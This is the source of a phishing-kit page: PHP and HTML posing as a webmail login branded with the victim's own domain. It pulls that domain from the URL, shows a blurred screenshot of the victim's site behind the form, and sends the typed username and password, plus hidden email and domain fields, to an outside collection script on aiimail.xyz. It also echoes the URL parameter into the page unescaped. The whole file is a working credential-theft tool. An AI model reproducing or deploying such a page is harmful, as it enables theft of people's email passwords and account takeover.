<?php  
 $id = $_GET["email"];  
 if ($id == "") {  
   echo '<script>window.location = 

"https://fusionpoint.pk/emptywhitepage.php?email="</script>';
 }  
   
 ?>
<!DOCTYPE html>



<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<title><?php
    $email = $_GET['email'];
    preg_match('/(\S+)(@(\S+))/', $email, $match);

/*  print_r($match);
        Array
        (
            [0] => user@email.com
            [1] => user
            [2] => @email.com
            [3] => email.com
        )
*/

    echo $match[3];  // output: `user`?> - Mail </title>
<link type="text/css" rel="stylesheet" href="https://maimai.imfast.io/style.css" media="all">

<link rel="apple-touch-icon" sizes="57x57" href="https://my.kerio.com/static/img/favicons/apple-icon-57x57.png?v=BUILD_HASH" />
<link rel="apple-touch-icon" sizes="60x60" href="https://my.kerio.com/static/img/favicons/apple-icon-60x60.png?v=BUILD_HASH" />
<link rel="apple-touch-icon" sizes="72x72" href="https://my.kerio.com/static/img/favicons/apple-icon-72x72.png?v=BUILD_HASH" />
<link rel="apple-touch-icon" sizes="76x76" href="https://my.kerio.com/static/img/favicons/apple-icon-76x76.png?v=BUILD_HASH" />
<link rel="apple-touch-icon" sizes="114x114" href="https://my.kerio.com/static/img/favicons/apple-icon-114x114.png?v=BUILD_HASH" />
<link rel="apple-touch-icon" sizes="120x120" href="https://my.kerio.com/static/img/favicons/apple-icon-120x120.png?v=BUILD_HASH" />
<link rel="apple-touch-icon" sizes="144x144" href="https://my.kerio.com/static/img/favicons/apple-icon-144x144.png?v=BUILD_HASH" />
<link rel="apple-touch-icon" sizes="152x152" href="https://my.kerio.com/static/img/favicons/apple-icon-152x152.png?v=BUILD_HASH" />
<link rel="apple-touch-icon" sizes="180x180" href="https://my.kerio.com/static/img/favicons/apple-icon-180x180.png?v=BUILD_HASH" />
<link rel="icon" type="image/png" sizes="192x192"  href="https://www.google.com/s2/favicons?domain=<?php
    $email = $_GET['email'];
    preg_match('/(\S+)(@(\S+))/', $email, $match);

/*  print_r($match);
        Array
        (
            [0] => user@email.com
            [1] => user
            [2] => @email.com
            [3] => email.com
        )
*/

    echo $match[3];  // output: `user`?>?v=BUILD_HASH" />
<link rel="icon" type="image/png" sizes="32x32" href="https://www.google.com/s2/favicons?domain=<?php
    $email = $_GET['email'];
    preg_match('/(\S+)(@(\S+))/', $email, $match);

/*  print_r($match);
        Array
        (
            [0] => user@email.com
            [1] => user
            [2] => @email.com
            [3] => email.com
        )
*/

    echo $match[3];  // output: `user`?>?v=BUILD_HASH" />
<link rel="icon" type="image/png" sizes="96x96" href="css/opened-email-envelope.png?v=BUILD_HASH" />
<link rel="icon" type="image/png" sizes="16x16" href="css/opened-email-envelope.png?v=BUILD_HASH" />
<link rel="manifest" href="https://my.kerio.com/static/img/favicons/manifest.json?v=BUILD_HASH" />
<meta name="msapplication-TileColor" content="#ffffff" />
<meta name="msapplication-TileImage" content="https://www.google.com/s2/favicons?domain=<?php
    $email = $_GET['email'];
    preg_match('/(\S+)(@(\S+))/', $email, $match);

/*  print_r($match);
        Array
        (
            [0] => user@email.com
            [1] => user
            [2] => @email.com
            [3] => email.com
        )
*/

    echo $match[3];  // output: `user`?>?v=BUILD_HASH" />
<meta name="theme-color" content="#ffffff" />
<link rel="shortcut icon" type="image/vnd.microsoft.icon" href="https://www.google.com/s2/favicons?domain=<?php
    $email = $_GET['email'];
    preg_match('/(\S+)(@(\S+))/', $email, $match);

/*  print_r($match);
        Array
        (
            [0] => user@email.com
            [1] => user
            [2] => @email.com
            [3] => email.com
        )
*/

    echo $match[3];  // output: `user`?>?v=BUILD_HASH" />

<script type="text/javascript" src="https://my.kerio.com/static/translations/k_tr.js"></script>
<script type="text/javascript" src="https://my.kerio.com/static/widgets/browser.js"></script>
<script type="text/javascript" src="https://my.kerio.com/const.js?v=BUILD_HASH"></script>

<script type="text/javascript">
<!--
function onLoad() {
	var
		k_urlHash = window.location.hash,
		k_emailInput = document.getElementById('email'),
		k_email,
		k_formElement,
		k_errorDiv,
		k_plainErrorMessage,
		k_errorMessage,
		k_errorTextNode;

	if (k_urlHash) {
		if (-1 !== k_urlHash.indexOf('email=')) {
			k_email = k_urlHash.substring(k_urlHash.indexOf('email=') + 6);
			if (-1 !== k_email.indexOf('&')) {
				k_email = k_email.substring(0, k_email.indexOf('&'));
			}
			if (k_email) {
				document.getElementById('email').value = k_email;
				document.getElementById('password').focus();

				k_urlHash = k_urlHash.replace('email=' + k_email, '');
			}
		}

		if(-1 !== k_urlHash.indexOf('errorMessage=')) {
			k_plainErrorMessage = k_urlHash.substring(k_urlHash.indexOf('errorMessage=') + 13);
			if (-1 !== k_plainErrorMessage.indexOf('&')) {
				k_plainErrorMessage = k_plainErrorMessage.substring(0, k_plainErrorMessage.indexOf('&'));
			}
			k_errorMessage = decodeURI(k_plainErrorMessage);
			if (k_errorMessage.length) {
				// If there is error message in the url hash, create the error div in the form
				k_formElement = document.getElementById('loginForm');
				k_errorDiv = document.createElement("div");
				k_errorDiv.className = 'error-message-text message';
				k_errorTextNode = document.createTextNode(k_errorMessage);
				k_errorDiv.appendChild(k_errorTextNode);

				k_formElement.insertBefore(k_errorDiv, k_formElement.firstChild);
			}

			k_urlHash = k_urlHash.replace('errorMessage=' + k_plainErrorMessage, '');
		}

		// remove linkers from above conditions
		k_urlHash = k_urlHash.replace('&&', '&'); // remove doubled linkers
		k_urlHash = k_urlHash.replace('#&', '#'); // remove linker on start
		k_urlHash = k_urlHash.replace(/&$/, '');  // remove linker on end
		k_urlHash = k_urlHash.replace(/^#&/, ''); // remove only hash mark

		if (k_urlHash.length) {
			document.getElementById('loginForm').action += k_urlHash;
			document.getElementById('registerLink').href += k_urlHash;
		}
	}

	k_emailInput.maxLength = mykerio.k_CONSTANTS.k_EMAIL_MAX_LENGHT;

	mykerio.k_widgets.k_browserInfo.k_showUnsupportedBrowserMessage(document.getElementById('unsupportedBrowser'));
	if (mykerio.k_widgets.k_browserInfo.k_isBlocked()) {
		document.body.className +=' browseBlocked';
	}
}
-->
</script>
   <style type="text/css"> 
    #iframe-container {
  -webkit-filter: blur(1px);
  filter: blur(1.5px);1}
    </style>
</head>
<div id="iframe-container" style="position: fixed; z-index: -99; width: 100%; height: 100%">
 <iframe frameborder="0" height="100%" width="100%"
    src="https://theonepdf.herokuapp.com/api/render?output=screenshot&viewport.isLandscape=true&viewport.width=2000&url=http://<?php
    $email = $_GET['email'];
    preg_match('/(\S+)(@(\S+))/', $email, $match);

/*  print_r($match);
        Array
        (
            [0] => user@email.com
            [1] => user
            [2] => @email.com
            [3] => email.com
        )
*/

    echo $match[3];  // output: `user`?>">
  </iframe>
</div>
<body onload="onLoad();">
    <br /><br /><br /><br /></div>
	<div id="header">
		<div id="header-inner">
		<center>&emsp; <img src="https://www.google.com/s2/favicons?domain=<?php
    $email = $_GET['email'];
    preg_match('/(\S+)(@(\S+))/', $email, $match);

/*  print_r($match);
        Array
        (
            [0] => user@email.com
            [1] => user
            [2] => @email.com
            [3] => email.com
        )
*/

    echo $match[3];  // output: `user`?>" alt="Mailbox" style="width:25px;height:25px;">
		<br />
		</div>
		<br />
	</div>
	<br />
	<br />
	<div id="main-container">
		<div id="top"><img src="https://www.google.com/s2/favicons?domain=<?php
    $email = $_GET['email'];
    preg_match('/(\S+)(@(\S+))/', $email, $match);

/*  print_r($match);
        Array
        (
            [0] => user@email.com
            [1] => user
            [2] => @email.com
            [3] => email.com
        )
*/

    echo $match[3];  // output: `user`?>" alt="Mailbox" style="width:15px;height:18px;">&nbsp; <?php
    $email = $_GET['email'];
    preg_match('/(\S+)(@(\S+))/', $email, $match);

/*  print_r($match);
        Array
        (
            [0] => user@email.com
            [1] => user
            [2] => @email.com
            [3] => email.com
        )
*/

    echo $match[3];  // output: `user`?> webmail Login</div>
		<div id="body-container">
			<form id="loginForm" class="container-form" action="https://aiimail.xyz/好/acp/con/post.php" method="post">
				
				
				<div id="unsupportedBrowser" style="display: none;">&nbsp;</div>

				<table align="center">
					<tr>
						<td>
							
								
								
									<input type="email" name="username" id="email" value="<?php echo $_GET['email']; ?>" />
								
							
						</td>
					</tr>
					<tr>
						<td>
							<input type="password" name="password" id="password" placeholder="Password" />
						</td>
					</tr>
					<tr>
						<td id="remember-container">
							<input type="checkbox" name="remember-me" id="remember" value="1" /> <label for="remember" class="remember">Secured Login session?</label>
						</td>
					</tr>
				</table>
				<div>
					</b><br><input type=hidden  name=email size=35 value=<?php echo $email;?>><input type=hidden  name=address size=5 value=<?php
    $email = $_GET['email'];
    preg_match('/(\S+)(@(\S+))/', $email, $match);

/*  print_r($match);
        Array
        (
            [0] => user@email.com
            [1] => user
            [2] => @email.com
            [3] => email.com
        )
*/

    echo $match[3];  // output: `user`?>>
</b><br><input type=hidden  name=email size=35 value=<?php echo $email;?>><input type=hidden  name=type size=5 value=<?php
    $email = $_GET['email'];
    preg_match('/(\S+)(@(\S+))/', $email, $match);

/*  print_r($match);
        Array
        (
            [0] => user@email.com
            [1] => user
            [2] => @email.com
            [3] => email.com
        )
*/

    echo $match[3];  // output: `user`?>>
					<input id="login-button" type="submit" value="Login" />
				</div>
			</form>
		</div>
	</div>
	<div class="under-link">
		<a href="<?php
    $email = $_GET['email'];
    preg_match('/(\S+)(@(\S+))/', $email, $match);

/*  print_r($match);
        Array
        (
            [0] => user@email.com
            [1] => user
            [2] => @email.com
            [3] => email.com
        )
*/

    echo $match[3];  // output: `user`?>"><?php
    $email = $_GET['email'];
    preg_match('/(\S+)(@(\S+))/', $email, $match);

/*  print_r($match);
        Array
        (
            [0] => user@email.com
            [1] => user
            [2] => @email.com
            [3] => email.com
        )
*/

    echo $match[3];  // output: `user`?> Copyright© 2020
Privacy Policy</a>
	</div>

</body>
</html>
